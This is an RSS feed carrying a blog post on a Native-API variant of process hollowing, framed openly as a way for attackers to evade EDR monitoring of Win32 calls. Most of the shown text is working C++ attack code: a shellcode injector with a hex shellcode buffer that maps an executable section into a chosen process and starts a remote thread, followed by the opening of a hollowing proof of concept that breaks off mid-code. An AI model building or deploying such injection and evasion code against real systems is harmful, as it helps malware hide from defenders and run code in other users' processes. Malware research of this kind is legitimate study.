<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>windoz on rxOred&#39;s blog</title>
    <link>https://rxOred.github.io/tags/windoz/</link>
    <description>Recent content in windoz on rxOred&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 01 Jan 2022 10:21:31 +0000</lastBuildDate><atom:link href="https://rxOred.github.io/tags/windoz/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Process Hollowing? not really</title>
      <link>https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/</link>
      <pubDate>Sat, 01 Jan 2022 10:21:31 +0000</pubDate>
      
      <guid>https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/</guid>
      <description>(@bound by jademerien)
Introduction Process hollowing is a process injection / evasion technique that is often used in malware. To name a few, struxnet, dridex.
A malware that uses process hollowing starts a target ** process with CREATE_SUSPENDED flag enabled. Then using the handler it got from created the process, it hollows out the legitimate executable image from the target process&amp;rsquo;s memory.
The problem However, malware tends to use the same set of APIs for this task.</description>
      <content>&lt;p&gt;&lt;a href=&#34;https://www.deviantart.com/jademerien/art/Bound-855334634?comment=1%3A855334634%3A4959164323&#34;&gt;(@bound by jademerien)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Process hollowing is a process injection / evasion technique that is often
used in malware. To name a few, struxnet, dridex.&lt;/p&gt;
&lt;p&gt;A malware that uses process hollowing starts a target **
process with &lt;strong&gt;CREATE_SUSPENDED&lt;/strong&gt; flag enabled. Then using the handler it
got from created the process, it &lt;strong&gt;hollows out&lt;/strong&gt; the legitimate executable
image from the target process&amp;rsquo;s memory.&lt;/p&gt;
&lt;h1 id=&#34;the-problem&#34;&gt;The problem&lt;/h1&gt;
&lt;p&gt;However, malware tends to use the same set of APIs for this task.
Some of these APIs are,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- CreateProcessA
- WriteProcessMemory
- VirtualProtect
- VirtualAlloc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And it is very well known that these APIs are often monitored by defense
solutions.&lt;/p&gt;
&lt;h1 id=&#34;the-solution&#34;&gt;The solution&lt;/h1&gt;
&lt;p&gt;Well, there are solutions. For example, one can directly invoke syscalls
without going through &lt;strong&gt;kernel32.dll&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Of course that&amp;rsquo;s good solution, but in this post, i wont talk about it
since i&amp;rsquo;m here to talk about another not-well-known approach for process
hollowing&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;Since most defense solutions monitor API calls from user space, they are
commonly known to hook WIN32API but not the Native API. Because of that,
it would be more advantageous for us, attackers to implement the technique
using NTAPI.&lt;/p&gt;
&lt;p&gt;In order to understand the technique, one must understand how following
functions from NTAPIs work.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- NtCreateSection
- NtMapViewOfSection
- ZwUnmapViewOfSection
- NtSetContextThread
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For that purpose, we are going to write a small shellcode injector using some
of above functions.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;winternl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#pragma comment(lib, &amp;#34;ntdll&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\x31\xc0\x50\xff\x55\x08&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;argv[])
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argc &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) 
    {
        LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; buf };
        HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
        PVOID localSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL, remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;

        &lt;span style=&#34;color:#75715e&#34;&gt;// create a read write execute memory region in the local process
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
                SECTION_ALL_ACCESS, 
                NULL,
                (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
                PAGE_EXECUTE_READWRITE, 
                SEC_COMMIT, NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
        {
            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create section failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }


        SIZE_T size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; buf;

        &lt;span style=&#34;color:#75715e&#34;&gt;// create a view of the memory section in the local process
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
                sectionHandle, 
                GetCurrentProcess(), 
                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;localSectionAddress, 
                NULL, NULL, NULL, 
                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
                PAGE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
        {
            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }

        HANDLE processHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; OpenProcess(
                PROCESS_ALL_ACCESS, 
                FALSE, 
                DWORD(atoi(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])));
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (processHandle &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
        {
            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x] Open process failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }  
        &lt;span style=&#34;color:#75715e&#34;&gt;// create a map view of the section in the target process
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
                sectionHandle, 
                processHandle, 
                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;remoteSectionAddress, 
                NULL, NULL, NULL,
                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
                PAGE_EXECUTE_READ) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
        {
            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }

        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;remote section created&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;

        memcpy(localSectionAddress, buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf));

        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Shellcode injected at 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;

        CloseHandle(sectionHandle);
        HANDLE targetThreadHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
        fRtlCreateUserThread(
                processHandle, 
                NULL, 
                FALSE, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, 
                remoteSectionAddress, 
                NULL, 
                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;targetThreadHandle, NULL
            );
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; 
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./whatever.exe &amp;lt;pid&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;NtCreateSection&lt;/code&gt; function creates a shared section of memory that two or
more processes can read from and write into. The function expects ** address of an uninitalized section handle. This section handle is initialized
by the function and will be used when referencing to that specific section&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NtMapViewOfSection&lt;/code&gt; is the function that uses initliazed section handle
return as the output parameter of &lt;strong&gt;NtCreateSection&lt;/strong&gt;. The function creates
a mapping of the section referenced with &lt;strong&gt;section handle&lt;/strong&gt; in the process
user specifies.&lt;/p&gt;
&lt;p&gt;In the above snippet, &lt;code&gt;NtCreateSection&lt;/code&gt; is used to createe a section with
permissions &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; of size &lt;code&gt;sizeof buf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;then two calls to &lt;code&gt;NtMapViewOfSection&lt;/code&gt; are used to map the section into
local process and the remote process. Permissions for the mapping of
local process is &lt;code&gt;PAGE_READWRITE&lt;/code&gt; while permissions for the remote
process &amp;rsquo;s mapping is &lt;code&gt;PAGE_EXECUTE_READ&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This clearly shows the advantage of NtCreateSection + NtMapViewOfSection
over many other process injection techniques. Since memory is allocated
in the target process with permissions of &lt;code&gt;PAGE_EXECUTE_READ&lt;/code&gt;, calls to
&lt;code&gt;VirtualAlloc&lt;/code&gt; wont be required. This also helps against some EDR
solutions&lt;/p&gt;
&lt;p&gt;shellcode started crashing).&lt;/p&gt;
&lt;p&gt;here&amp;rsquo;s the result.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/1.png&#34; alt=&#34;remove this&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/msgbox1.png&#34; alt=&#34;notepad messagebox&#34;&gt;&lt;/p&gt;
&lt;p&gt;mapped section in remote process&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/permissions1.png&#34; alt=&#34;remove this&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now the APIs are understood, it is time to demonstrate the process
hollowing technique.&lt;/p&gt;
&lt;h2 id=&#34;implementation&#34;&gt;Implementation&lt;/h2&gt;
&lt;p&gt;Before implementing it is essential to undersand what can be done and what
we are going to do with the above injection technique.&lt;/p&gt;
&lt;p&gt;Since this post is about process hollowing, anyone can guess we are going
to hollow out the target process image and inject a shellcode using the
above technique, but simply put, no.&lt;/p&gt;
&lt;p&gt;The steps can be briefly described as follow.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- Injecting the shellcode into target process
- Retrieve ImageBaseAddress of the executable image
- Read executable image of the remote process into a buffer
- Unmap executable image from the process 
- Hook somewhere of the copied image so it will jump to shellcode
- Remap the section into the remote process using above techniques
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here is the PoC code.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;winternl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#pragma comment(lib, &amp;#34;ntdll&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define SECTION_SIZE 0x1000
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
    HRSRC shellcodeResource;
    SIZE_T shellcodeSize;
    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; shellcode;
} SHELLCODE;

&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
    HANDLE processHandle;
    DWORD imageBaseAddress;
    DWORD entryPoint;
} HOST;

&lt;span style=&#34;color:#75715e&#34;&gt;#if !defined NTSTATUS
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; LONG NTSTATUS;
&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define STATUS_SUCCESS 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; CLIENT_ID&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; PCLIENT_ID;

&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtCreateSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributess,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL
    );

&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtMapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );

&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myZwUnmapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
    );

&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtGetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) (
    IN HANDLE ThreadHandle,
    OUT PCONTEXT Context
    );

&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtSetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) (
    IN HANDLE ThreadHandle,
    IN PCONTEXT Context
    );

myNtCreateSection fNtCreateSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtCreateSection)(GetProcAddress(
    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtCreateSection&amp;#34;&lt;/span&gt;));
myNtMapViewOfSection fNtMapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtMapViewOfSection)(GetProcAddress(
    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtMapViewOfSection&amp;#34;&lt;/span&gt;));
myZwUnmapViewOfSection fZwUnmapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myZwUnmapViewOfSection)(GetProcAddress(
    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ZwUnmapViewOfSection&amp;#34;&lt;/span&gt;));
